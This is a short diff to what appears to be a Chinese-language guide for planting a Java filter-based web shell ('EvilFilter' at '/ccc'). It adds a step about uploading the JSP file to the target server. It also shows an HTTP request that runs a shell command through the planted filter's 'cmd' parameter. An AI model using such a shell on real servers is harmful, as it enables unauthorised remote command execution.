@@ -28,7 +28,9 @@ private static String filterClassName = "EvilFilter";
 private static String url = "/ccc";
 ```
 
-5. 访问
+5. 将jsp文件上传到目标服务器
+
+6. 访问
 
 ```
 GET /ccc?cmd=touch%20/tmp/success HTTP/1.1
